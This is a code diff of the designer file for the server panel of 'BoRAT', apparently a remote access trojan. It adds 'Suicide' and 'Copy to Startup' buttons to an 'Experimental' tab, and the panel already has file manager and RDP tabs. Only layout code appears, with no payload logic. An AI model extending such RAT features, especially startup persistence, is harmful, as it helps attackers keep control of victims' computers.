@@ -111,7 +111,9 @@ namespace BoRAT.Server
             this.tpFileManager = new System.Windows.Forms.TabPage();
             this.tpRDP = new System.Windows.Forms.TabPage();
             this.tpExperimental = new System.Windows.Forms.TabPage();
+            this.btnSuicide = new System.Windows.Forms.Button();
             this.rtbLog = new System.Windows.Forms.RichTextBox();
+            this.btnCopyToStartup = new System.Windows.Forms.Button();
             this.MenuClients.SuspendLayout();
             this.MenuFileManager.SuspendLayout();
             this.groupBox3.SuspendLayout();
@@ -489,7 +491,7 @@ namespace BoRAT.Server
             "%CurrentPath%"});
             this.comboEPath.Location = new System.Drawing.Point(121, 143);
             this.comboEPath.Name = "comboEPath";
-            this.comboEPath.Size = new System.Drawing.Size(177, 21);
+            this.comboEPath.Size = new System.Drawing.Size(177, 22);
             this.comboEPath.TabIndex = 4;
             this.comboEPath.Text = "Select";
             // 
@@ -960,6 +962,8 @@ namespace BoRAT.Server
             // 
             // tpExperimental
             // 
+            this.tpExperimental.Controls.Add(this.btnCopyToStartup);
+            this.tpExperimental.Controls.Add(this.btnSuicide);
             this.tpExperimental.Controls.Add(this.rtbLog);
             this.tpExperimental.Location = new System.Drawing.Point(4, 24);
             this.tpExperimental.Name = "tpExperimental";
@@ -968,14 +972,34 @@ namespace BoRAT.Server
             this.tpExperimental.Text = "Experimental";
             this.tpExperimental.UseVisualStyleBackColor = true;
             // 
+            // btnSuicide
+            // 
+            this.btnSuicide.Location = new System.Drawing.Point(8, 13);
+            this.btnSuicide.Name = "btnSuicide";
+            this.btnSuicide.Size = new System.Drawing.Size(75, 23);
+            this.btnSuicide.TabIndex = 2;
+            this.btnSuicide.Text = "Suicide";
+            this.btnSuicide.UseVisualStyleBackColor = true;
+            this.btnSuicide.Click += new System.EventHandler(this.btnSuicide_Click);
+            // 
             // rtbLog
             // 
-            this.rtbLog.Location = new System.Drawing.Point(8, 7);
+            this.rtbLog.Location = new System.Drawing.Point(8, 43);
             this.rtbLog.Name = "rtbLog";
-            this.rtbLog.Size = new System.Drawing.Size(950, 405);
+            this.rtbLog.Size = new System.Drawing.Size(950, 369);
             this.rtbLog.TabIndex = 1;
             this.rtbLog.Text = "";
             this.rtbLog.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
+            // 
+            // btnCopyToStartup
+            // 
+            this.btnCopyToStartup.Location = new System.Drawing.Point(86, 13);
+            this.btnCopyToStartup.Name = "btnCopyToStartup";
+            this.btnCopyToStartup.Size = new System.Drawing.Size(98, 23);
+            this.btnCopyToStartup.TabIndex = 3;
+            this.btnCopyToStartup.Text = "Copy to Startup";
+            this.btnCopyToStartup.UseVisualStyleBackColor = true;
+            this.btnCopyToStartup.Click += new System.EventHandler(this.btnCopyToStartup_Click);
             // 
             // frmMain
             // 
@@ -1102,5 +1126,7 @@ namespace BoRAT.Server
         private System.Windows.Forms.TabPage tpConnections;
         private System.Windows.Forms.TabPage tpExperimental;
         private System.Windows.Forms.RichTextBox rtbLog;
+        private System.Windows.Forms.Button btnSuicide;
+        private System.Windows.Forms.Button btnCopyToStartup;
     }
 }
